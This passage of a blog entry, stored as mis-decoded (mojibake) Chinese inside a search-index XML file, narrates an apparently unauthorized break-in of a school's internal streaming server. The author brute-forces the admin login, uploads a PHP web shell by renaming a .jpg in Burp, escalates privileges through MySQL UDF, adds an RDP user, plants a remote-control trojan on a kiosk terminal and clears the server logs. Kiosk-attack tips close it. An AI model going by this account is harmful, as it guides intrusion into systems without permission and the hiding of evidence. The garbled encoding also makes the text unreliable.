æœåä¾¿æ”¾å¼ƒäº†<br>ä½†æ˜¯æˆ‘å‘ç°äº†å­¦æ ¡çš„ä¸€ä¸ªæ ¡å†…ç›´æ’­å¹³å° 192.168.88.128:80</p><p>2.æ‰“å¼€ç›´æ’­å¹³å°åï¼Œå‘ç°æ¯æ¬¡ç›´æ’­çš„å‘èµ·äººçš„ç”¨æˆ·åå‡æ˜¯adminâ€¦.è¿æ°”å¥½ç‚¸<br>ç”¨æˆ·ç™»å½•ç•Œé¢æ²¡æœ‰éªŒè¯ç ï¼Œæœæ–­è¿›è¡Œä¸€æ³¢çŒ›å¦‚è™çš„çˆ†ç ´ã€‚ã€‚ï¼ˆå¿˜æˆªå›¾äº†ï¼‰</p><p>æˆåŠŸç™»å½•åå°ï¼Œæ‰¾åˆ°ä¸€ä¸ªLOGOçš„ä¸Šä¼ ç‚¹ä¸Šä¼ SHELL<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191410789.png" alt="image"></p><p>å¾ˆæ˜æ˜¾ã€‚ã€‚ã€‚æ‹¦æˆªæ‰äº†ï¼Œä½†æ˜¯ç›®æµ‹è‚¯å®šæ˜¯ç”¨çš„å‰ç«¯è®¤è¯ã€‚<br>ç›´æ¥åœ¨Burpçš„Httpè¯·æ±‚ä¸­ä¿®æ”¹shell.jpgä¸ºshell.php</p><p>å¦‚å›¾æ‰€ç¤º<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191410915.png" alt="image"></p><p>æˆåŠŸæ‹¿åˆ°SHELL<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191410865.png" alt="image"></p><h2 id="0x04-è›‹ç–¼çš„ææƒ"><a href="#0x04-è›‹ç–¼çš„ææƒ" class="headerlink" title="0x04:è›‹ç–¼çš„ææƒ"></a>0x04:è›‹ç–¼çš„ææƒ</h2><p>whoamiæ‰§è¡Œçœ‹äº†ä¸€ä¸‹ï¼Œæƒé™æ¯”è¾ƒå°ï¼Œæ²¡æœ‰cç›˜çš„å†™æƒé™(æ‰€ä»¥shiftåé—¨è¿˜æ˜¯ç®—äº†)ã€‚<br>äºæ˜¯æˆ‘ä¸Šäº†ä¸€å †msææƒé›†è¯•äº†ä¸‹ï¼Œå‘ç°è¡¥ä¸æ‰“çš„è¿˜ç®—æ˜¯åŠæ—¶ï¼Œéƒ½æ²¡ä»€ä¹ˆåµç”¨ã€‚ã€‚ã€‚<br>åæ¥ç¿»äº†ç¿»æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œæ‹¿åˆ°äº†æ•°æ®åº“çš„ç›¸å…³é…ç½®ä¿¡æ¯<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191411392.png" alt="image"></p><p>UDFææƒè¯•ä¸‹<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191411538.png" alt="image"></p><p>OKOKï¼Œéå¸¸å¯ä»¥ï¼Œç›´æ¥ä¸Šç”¨æˆ·ï¼Œä½¿ç”¨é»˜è®¤3389ç«¯å£ç™»å½•æœåŠ¡å™¨<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191411845.png" alt="image"></p><h2 id="0x05-æ”¶å°¾"><a href="#0x05-æ”¶å°¾" class="headerlink" title="0x05:æ”¶å°¾"></a>0x05:æ”¶å°¾</h2><p>æ‹¿åˆ°æœåŠ¡å™¨åï¼Œæˆ‘åœ¨ç½‘ç«™æ ¹ç›®å½•å†™äº†ä¸€ä¸ªPHPçš„æ–‡ä»¶ä¸‹è½½ç³»ç»Ÿï¼Œç„¶ååœ¨æœåŠ¡å™¨ä¸Šæ¶è®¾å¥½è¿œæ§ï¼Œè·‘åˆ°æ¥¼ä¸‹çš„ç»ˆç«¯æœºä¸Šä¸‹è½½äº†è¿œæ§æœ¨é©¬æ‰§è¡Œ<br>è¿™æ ·æ“ä½œå°±æ›´åŠ æ–¹ä¾¿äº†ã€‚æ­£å½“æˆ‘å‡†å¤‡è¿›è¡Œè¿›ä¸€æ­¥å—…æ¢æ—¶ï¼Œæˆ‘çœ‹äº†çœ‹æ—¶é—´å·²ç»ä¸æ—©äº†ã€‚ã€‚è€å¸ˆé©¬ä¸Šè¦ä¸‹è¯¾äº†ã€‚ã€‚</p><p>äºæ˜¯æˆ‘ä½¿ç”¨å·¥å…·æ¸…ç†äº†ä¸€ä¸‹æœåŠ¡å™¨æ—¥å¿—ï¼Œåˆ é™¤äº†shellï¼Œæ‹¿QQéŸ³ä¹æ”¾ä¸Šä¸€é¦–è€ç”·å­©ï¼Œé™é™åœ°å¬ç€ã€‚<br>éšåè€å¸ˆå›æ¥äº†ï¼Œæˆ‘ä»¬æ„‰å¿«çš„ç¦»å¼€æ ¡å›­ï¼Œæˆ‘å«ä¸Šä¸€ä¸ªåŸºå‹ä¸€å—åˆ°ä¸‡è¾¾åƒäº†é¡¿é¥­ï¼Œæ„Ÿè§‰è¿˜ä¸é”™<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191411549.png" alt="image"></p><h2 id="0x06-æƒ³æ³•ä¸æ€»ç»“"><a href="#0x06-æƒ³æ³•ä¸æ€»ç»“" class="headerlink" title="0x06:æƒ³æ³•ä¸æ€»ç»“"></a>0x06:æƒ³æ³•ä¸æ€»ç»“</h2><p>å½“æˆ‘ç¦»å¼€æ ¡å›­æ—¶ï¼Œæˆ‘é™é™åœ°å›é¦–æœ›å‘ä¸€åº§åº§æ•™å­¦æ¥¼â€”â€”é‚£æ˜¯æˆ‘æ¢¦æƒ³å¼€å§‹çš„åœ°æ–¹ã€‚<br>æ—¶è‡³ä»Šæ—¥æˆ‘å·²ä¸è®°å¾—å¤šå°‘ä¸ªæ— åŠ©çš„å¤œé‡Œé¢ï¼Œæˆ‘å¬ç€é‚£é¦–ã€Šè€ç”·å­©ã€‹ï¼Œç„¶ååœ¨å®¿èˆé‡Œå¼€ç€æ‰‹ç”µç­’èƒŒä¹¦ï¼Œå­¦æŠ€æœ¯<br>æˆ‘ä¹Ÿä¸éœ€è¦è®°å¾—ã€‚</p><p>ä¸‹é¢è¯´ä¸€ä¸‹ç»ˆç«¯æœºçš„å¸¸ç”¨æ¸—é€æµ‹è¯•æŠ€å·§:</p><blockquote><p>1.åœ¨ç»ˆç«¯æœºè¾“å…¥å†…å®¹æ—¶ï¼Œæ³¨æ„æ˜¯å¦å‡ºç°è¯­è¨€æ ï¼Œå¾ˆå¤šæƒ…å†µå¯ä»¥åˆ©ç”¨è¯­è¨€æ è¿›è¡Œæ¸—é€<br>2.å¯ä»¥é¢‘ç¹ç‚¹å‡»å±å¹•ï¼Œç¨‹åºæœ‰å¯èƒ½å´©æºƒæ‰ï¼ˆä¸è¦ç¬‘ï¼Œè¿™æ˜¯çœŸçš„ï¼‰<br>3.åˆ©ç”¨é•¿æ‘æŸä¸€ä½ç½®å‡ºç°çš„å³é”®èœå•ï¼ˆæ¯”å¦‚æœ¬ç¯‡æ–‡ç« ä¸­æµè§ˆå™¨ä¸­çš„å®¡æŸ¥å…ƒç´ ï¼‰<br>4.å¦‚æœå¯ä»¥æ¥è§¦åˆ°ç»ˆç«¯æœºçš„ç”µæºï¼Œå¯ä»¥ç”µæºï¼Œç„¶åè®©ç»ˆç«¯æœºé‡å¯ï¼Œå¾€å¾€ä¼šæœ‰æ„æƒ³ä¸åˆ°çš„ç»“æœ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç¡¬ä»¶å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
